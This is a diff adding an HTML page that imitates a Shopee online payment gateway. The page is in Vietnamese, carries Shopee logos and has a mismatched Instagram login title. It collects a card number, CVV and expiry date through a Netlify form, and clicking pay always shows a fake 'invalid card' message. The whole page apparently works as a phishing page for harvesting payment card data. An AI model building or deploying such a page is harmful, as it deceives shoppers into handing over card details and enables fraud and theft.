@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LogIn | Instagram</title>
+    <link rel="stylesheet" href="Checkout.css">
+    <link rel="shortcut icon" href="res/Logo-Shopee-Png.webp">
+
+</head>
+
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="res/Shopee.svg (1).png" alt="logo" height="500px">
+            </div>
+            <h1>Cổng thanh toán trực tuyến Shopee</h1>
+            <br>
+            <h2>Phương thức thanh toán:</h2>
+            <h3>Thẻ VISA</h3>
+            <br>
+            <div class="l-part">
+                <form name="info_card" netlify>
+                    <input type="text" id="card_number" placeholder="Số thẻ" class="input-1" maxlength="19"/>
+                    <div class="combine">
+                        <input type="text" id="cvv" placeholder="Số CVV" class="input-2" maxlength="3"/>
+                        <input type="text" id="visa_end" placeholder="mm/yyyy" class="input-2" maxlength="7"/>
+                    </div>
+                    </div>
+
+                    <input type="submit" id="btn" value="Thanh toán">
+                </form>
+            </div>
+        </div>
+
+
+
+    </div>
+</body>
+
+<script>
+    document.getElementById("card_number").addEventListener("input", function (e) {
+    let input = e.target.value;
+    input = input.replace(/\D/g, "");
+    input = input.replace(/(\d{4})(?=\d)/g, "$1 ");
+    e.target.value = input;
+});
+
+    document.getElementById("visa_end").addEventListener("input", function (e) {
+    let input = e.target.value;
+    input = input.replace(/\D/g, "");
+    input = input.replace(/(\d{2})(?=\d)/, "$1/");
+    input = input.substring(0, 7);
+    e.target.value = input;
+
+});
+
+document.getElementById("btn").addEventListener("click", function () {
+    alert("Thẻ Visa không hợp lệ, Quý khách vui lòng kiểm tra lại!");
+});
+</script>
+
+</html>
